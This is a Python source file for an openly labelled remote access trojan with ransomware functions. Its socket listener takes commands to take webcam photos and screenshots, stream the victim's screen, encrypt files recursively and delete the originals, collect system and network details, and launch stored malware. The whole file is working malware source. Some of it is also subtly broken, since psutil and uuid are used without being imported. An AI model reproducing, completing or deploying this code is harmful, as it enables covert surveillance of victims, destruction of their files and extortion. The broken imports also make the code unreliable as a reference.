import socket
import json
import base64
import os
import time
import threading
import subprocess
from datetime import datetime
import sys
import signal
import cv2
import numpy as np
import pyautogui
from cryptography.fernet import Fernet

# Configuration
C2_IP = "192.168.1.3"  # CHANGE THIS
C2_PORT = 4444
LOG_FILE = "victim_logs.txt"
MALWARE_FOLDER = "malware_storage"  # Folder containing your malware files

class VictimControl:
    def __init__(self):
        self.webcam_count = 0
        self.screenshot_count = 0
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.live_stream_active = False

    # System Information
    def get_system_info(self):
        info = {
            "system": {
                "hostname": os.getenv("COMPUTERNAME"),
                "username": os.getenv("USERNAME"),
                "os": f"{os.name} {sys.platform}",
                "cpu": os.cpu_count(),
                "memory": psutil.virtual_memory()._asdict()
            },
            "network": {
                "ip": socket.gethostbyname(socket.gethostname()),
                "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                      for ele in range(0,8*6,8)][::-1])
            }
        }
        return info

    # Webcam Capture
    def capture_webcam(self):
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        cam.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            return base64.b64encode(buffer).decode()
        return None

    # Screenshot Capture
    def capture_screenshot(self):
        screenshot = pyautogui.screenshot()
        buffer = np.array(screenshot)
        _, buffer = cv2.imencode('.png', buffer)
        return base64.b64encode(buffer).decode()

    # File Encryption (Ransomware)
    def encrypt_files(self, path):
        encrypted_files = []
        for root, _, files in os.walk(path):
            for file in files:
                try:
                    filepath = os.path.join(root, file)
                    with open(filepath, 'rb') as f:
                        data = f.read()
                    encrypted = self.cipher.encrypt(data)
                    with open(filepath + '.encrypted', 'wb') as f:
                        f.write(encrypted)
                    os.remove(filepath)
                    encrypted_files.append(filepath)
                except:
                    continue
        return encrypted_files

    # File Decryption
    def decrypt_files(self, path, key):
        try:
            cipher = Fernet(key)
            for root, _, files in os.walk(path):
                for file in files:
                    if file.endswith('.encrypted'):
                        try:
                            filepath = os.path.join(root, file)
                            with open(filepath, 'rb') as f:
                                data = f.read()
                            decrypted = cipher.decrypt(data)
                            with open(filepath[:-9], 'wb') as f:
                                f.write(decrypted)
                            os.remove(filepath)
                        except:
                            continue
            return True
        except:
            return False

    # Live Screen Monitoring
    def start_live_monitoring(self, conn):
        self.live_stream_active = True
        while self.live_stream_active:
            try:
                screenshot = self.capture_screenshot()
                conn.send(('LIVE:' + screenshot).encode())
                time.sleep(0.5)  # Adjust for smoother streaming
            except:
                self.live_stream_active = False
                break

    # Malware Deployment
    def deploy_malware(self, malware_name):
        try:
            malware_path = os.path.join(MALWARE_FOLDER, malware_name)
            if os.path.exists(malware_path):
                subprocess.Popen(malware_path, shell=True)
                return True
            return False
        except:
            return False

def handle_connection(conn, addr):
    rat = VictimControl()
    print(f"\n[+] New connection from {addr[0]}")
    
    # Send initial system info
    conn.send(json.dumps(rat.get_system_info()).encode())
    
    while True:
        try:
            cmd = conn.recv(1024).decode().strip()
            if not cmd:
                continue
                
            if cmd == "webcam":
                data = rat.capture_webcam()
                conn.send(data.encode() if data else b"WEBCAM_ERROR")
                
            elif cmd == "screenshot":
                data = rat.capture_screenshot()
                conn.send(data.encode() if data else b"SCREENSHOT_ERROR")
                
            elif cmd.startswith("encrypt "):
                path = cmd[8:]
                encrypted = rat.encrypt_files(path)
                conn.send(json.dumps(encrypted).encode())
                
            elif cmd.startswith("decrypt "):
                parts = cmd.split(maxsplit=2)
                if len(parts) == 3:
                    success = rat.decrypt_files(parts[1], parts[2])
                    conn.send(b"DECRYPT_SUCCESS" if success else b"DECRYPT_FAILED")
                    
            elif cmd == "live_start":
                threading.Thread(target=rat.start_live_monitoring, args=(conn,)).start()
                conn.send(b"LIVE_STARTED")
                
            elif cmd == "live_stop":
                rat.live_stream_active = False
                conn.send(b"LIVE_STOPPED")
                
            elif cmd.startswith("deploy "):
                malware = cmd[7:]
                success = rat.deploy_malware(malware)
                conn.send(b"MALWARE_DEPLOYED" if success else b"MALWARE_FAILED")
                
            elif cmd == "exit":
                break
                
            else:
                conn.send(b"UNKNOWN_COMMAND")
                
        except ConnectionResetError:
            print(f"[-] Connection lost with {addr[0]}")
            break
        except Exception as e:
            print(f"[-] Error: {str(e)}")
            continue
            
    conn.close()
    print(f"[-] Connection closed: {addr[0]}")

def start_listener():
    if not os.path.exists(MALWARE_FOLDER):
        os.makedirs(MALWARE_FOLDER)
        print(f"[*] Created malware storage folder: {MALWARE_FOLDER}")

    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', C2_PORT))
    s.listen(5)
    print(f"[*] Listening on {C2_IP}:{C2_PORT}")
    
    try:
        while True:
            conn, addr = s.accept()
            threading.Thread(target=handle_connection, args=(conn, addr)).start()
    except KeyboardInterrupt:
        print("\n[!] Shutting down server...")
    finally:
        s.close()

if __name__ == "__main__":
    start_listener()